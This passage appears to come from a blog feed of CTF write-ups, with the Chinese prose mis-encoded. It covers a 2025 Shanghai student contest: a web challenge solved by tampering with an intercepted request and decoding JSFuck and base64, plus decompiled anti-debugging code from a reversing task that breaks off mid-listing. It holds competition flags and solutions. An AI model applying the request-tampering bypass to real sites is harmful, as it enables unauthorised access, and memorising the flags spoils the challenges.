apache"><span class="hljs-attribute">flag04</span>: flag&#123;<span class="hljs-number">126</span>d2f61-<span class="hljs-number">43</span>e0-<span class="hljs-number">42</span>e7-b6ff-<span class="hljs-number">3</span>f61946c3f67&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>æ˜¥ç§‹äº‘é•œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Redis Wordpress S4U</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025 ç¬¬åå±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›æš¨&quot;ç£çŸ³è¡ŒåŠ¨&quot;-åˆèµ›</title>
    <link href="/2025/08/12/2025%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-%E5%88%9D%E8%B5%9B/"/>
    <url>/2025/08/12/2025%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezDecryption"><a href="#ezDecryption" class="headerlink" title="ezDecryption"></a>ezDecryption</h2><p>f12 æ‰¾åˆ° hintï¼Œç¬¬ä¸€å…³éªŒè¯ç ä¸º 2025</p><p><img src="https://img.dkdun.cn/v1/2025/12/f7d66b262cd16edd.png"></p><p>æŠ“åŒ…ä¿®æ”¹æ•°æ®åŒ…ç›´æ¥è·³è¿‡ç¬¬äºŒå…³</p><p><img src="https://img.dkdun.cn/v1/2025/12/b0033f6b2cf0add7.png"></p><p>æŸ¥çœ‹ js ä»£ç ï¼Œå‘ç°æœ‰ jsFuck åŠ å¯†å’Œ base åŠ å¯†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">validateCode</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-comment">// è¿™é‡ŒåŒ…å«éªŒè¯é€»è¾‘</span><br>        <span class="hljs-keyword">const</span> _0x1 = [][(![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]] + (+(!+[] + !+[] + !+[] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + !+[] + [!+[] + !+[]]) + (![] + [])[+!+[]] + (![] + [])[!+[] + !+[]])()((![] + [])[+!+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][(!![] + [])[!+[] + !+[] + !+[]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (!![] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]]]() + [])[!+[] + !+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[+!+[] + [+!+[]]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]()[+!+[] + [!+[] + !+[]]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [])[+!+[]] + (+(!+[] + !+[] + [+!+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + !+[] + [+!+[]])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]])()([][(![] + [])[+!+[]] + (!![] + [])[+[]]])[(![] + [])[+!+[]] + (!![] + [])[+[]]]((+((+(+!+[] + [+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + [!+[] + !+[]] + [+[]]) + [])[+!+[]] + [+[] + [+[]] + [+[]] + [+[]] + [+[]] + [+[]] + [+!+[]]]) + [])[!+[] + !+[]] + [+!+[]]) + (![] + [])[+!+[]] + (!![] + [])[+[]] + (!![] + [])[!+[] + !+[] + !+[]])()())[!+[] + !+[] + !+[] + [+[]]] + (+[] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + [!+[] + !+[]] + (+(+!+[] + [+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + [+!+[]])[+!+[]] + (+(!+[] + !+[] + [+!+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + !+[] + [+!+[]])[+!+[]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]()[+!+[] + [!+[] + !+[]]] + ([] + [] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [!+[] + !+[]]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]](+[![]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]()[+!+[] + [!+[] + !+[]]])[!+[] + !+[] + [+!+[]]])<br>        <span class="hljs-keyword">const</span> _0x2 = <span class="hljs-title function_">atob</span>(<span class="hljs-string">&quot;Mm9aNQ==&quot;</span>);<br>        <span class="hljs-keyword">const</span> secretCode = _0x1 + _0x2;<br>        <span class="hljs-keyword">return</span> secretCode;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/12ab76132b8609b5.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/3205d971e5c3eb45.png"></p><p>è§£å¯†å¯†æ–‡æ„é€  secretCode</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pa<span class="hljs-symbol">nshi2</span>oZ<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/98f62dcf7ba2a78d.png"></p><p>æ‹¿åˆ° flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;d1g1t4l_l0ck_br34k3r_2025&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h2><p>å®šä½åˆ° mian å‡½æ•°ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²ç»è¿‡åŠ å¯†åè¿›è¡Œé€å­—èŠ‚æ¯”è¾ƒæ˜¯å¦ç›¸åŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  HANDLE CurrentProcess; <span class="hljs-comment">// rax</span><br>  FILE *v4; <span class="hljs-comment">// rax</span><br>  __int64 v5; <span class="hljs-comment">// rsi</span><br>  __int64 v6; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// rax</span><br>  __int64 v8; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// r8d</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// ecx</span><br>  __int64 v13; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">int</span> v17; <span class="hljs-comment">// eax</span><br>  BOOL v18; <span class="hljs-comment">// edx</span><br>  __int64 v19; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v20; <span class="hljs-comment">// rcx</span><br>  BOOL pbDebuggerPresent; <span class="hljs-comment">// [rsp+20h] [rbp-108h] BYREF</span><br>  <span class="hljs-type">char</span> v23[<span class="hljs-number">112</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-F8h] BYREF</span><br>  <span class="hljs-type">char</span> v24[<span class="hljs-number">112</span>]; <span class="hljs-comment">// [rsp+A0h] [rbp-88h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( IsDebuggerPresent()<br>    || (pbDebuggerPresent = <span class="hljs-number">0</span>,<br>        CurrentProcess = GetCurrentProcess(),<br>        CheckRemoteDebuggerPresent(CurrentProcess, &amp;pbDebuggerPresent),<br>        pbDebuggerPresent)<br>    || (SetLastError(<span class="hljs-number">0</span>), OutputDebugStringA(<span class="hljs-string">&quot;DebuggerTest&quot;</span>), GetLastError()) )<br>  &#123;<br>    sub_140001010(<span class="hljs-string">&quot;Nothing to see here...\n&quot;</span>);<br>    sub_140004C04(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    sub_140001010(<span class="hljs-string">&quot;Please enter the flag: &quot;</span>);<br>    v4 = _acrt_iob_func(<span class="hljs-number">0</span>);<br>    common_fgets&lt;<span class="hljs-type">char</span>&gt;(v24, <span class="hljs-number">100</span>i64, v4);<br>    v5 = <span class="hljs-number">-1</span>i64;<br>    v6 = <span class="hljs-number">-1</span>i64;<br>    <span class="hljs-keyword">do</span><br>      ++v6;<br>    <span class="hljs-keyword">while</span> ( v24[v6] );<br>    v7 = (<span class="hljs-type">int</span>)v6 - <span class="hljs-number">1</span>i64;<br>    <span class="hljs-keyword">if</span> ( v24[v7] == <span class="hljs-number">10</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v7 &gt;= <span class="hljs-number">0x64</span> )<br>        _report_rangecheckfailure();<br>      v24[v7] = <span class="hljs-number">0</span>;<br>      LODWORD(v6) = v6 - <span class="hljs-number">1</span>;<br>    &#125;<br>    v8 = <span class="hljs-number">0</span>i64;<br>    <span class="hljs-built_in">strcpy</span>(v23, <span class="hljs-string">&quot;CBAZYX&quot;</span>);<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v23[v8] == <span class="hljs-number">88</span> )<br>        sub_140001010(<span class="hljs-string">&quot;Found special character!\n&quot;</span>);<br>      ++v8;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v8 &lt; <span class="hljs-number">6</span> );<br>    v9 = v6;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>        v11 = (v9 | <span class="hljs-number">0x10000</span>) &gt;&gt; <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">else</span><br>        v11 = (<span class="hljs-number">2</span> * v9) ^ <span class="hljs-number">0xABCD</span>;<br>      <span class="hljs-keyword">if</span> ( v11 % <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v11 % <span class="hljs-number">3</span> == <span class="hljs-number">1</span> )<br>          v9 = v11 - i;<br>        <span class="hljs-keyword">else</span><br>          v9 = (<span class="hljs-number">16</span> * i) ^ v11;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v9 = i * i + v11;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int16)v9 == <span class="hljs-number">10</span> * ((<span class="hljs-type">unsigned</span> __int16)v9 / <span class="hljs-number">0xA</span>u) )<br>      sub_140001010(<span class="hljs-string">&quot;Processing...\n&quot;</span>);<br>    v12 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>      ++v5;<br>    <span class="hljs-keyword">while</span> ( v24[v5] );<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)v5 &gt; <span class="hljs-number">0</span> )<br>    &#123;<br>      v13 = <span class="hljs-number">0</span>i64;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v14 = v24[v13++];<br>        v12 = <span class="hljs-number">17</span> * (v12 + v14) % <span class="hljs-number">255</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v13 &lt; (<span class="hljs-type">int</span>)v5 );<br>      <span class="hljs-keyword">if</span> ( v12 == <span class="hljs-number">42</span> )<br>        sub_140001010(<span class="hljs-string">&quot;Interesting input...\n&quot;</span>);<br>    &#125;<br>    v15 = <span class="hljs-number">0</span>;<br>    v16 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)v6 &gt; <span class="hljs-number">0</span> )<br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v17 = v16 + v15;<br>        v15 = v16 + v15 - <span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">if</span> ( v17 &lt;= <span class="hljs-number">100</span> )<br>          v15 = v17;<br>        ++v16;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v16 &lt; (<span class="hljs-type">int</span>)v6 );<br>      <span class="hljs-keyword">if</span> ( v15 == <span class="hljs-number">1337</span> )<br>        sub_140001010(<span class="hljs-string">&quot;You found a secret number!\n&quot;</span>);<br>    &#125;<br>    sub_140001070((__int64)v24, v6, v23);<br>    v18 = v6 == <span class="hljs-number">29</span>;<br>    <span class="hljs-keyword">if</span> ( (_DWORD)v6 == <span class="hljs-number">29</span> )<br>    &#123;<br>      v19 = <span class="hljs-number">0</span>i64;<br>      <span class="hljs-keyword">while</span> ( v23[v19] == word_14001D658[v19] )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( ++v19 &gt;= <span class="hljs-number">29</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_44;<br>      &#125;<br>      v18 = <span class="hljs-number">0</span>;<br>    &#125;<br>LABEL_44:<br>    v20 = <span class="hljs-string">&quot;Congratulations! You found the correct flag!\n&quot;</span>;<br>    <span class="hljs-keyword">if</span> ( !v18 )<br>      v20 = <span class="hljs-string">&quot;Incorrect flag. Try again!\n&quot;</span>;<br>    sub_140001010(v20);<br>    sub_140004C04(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span 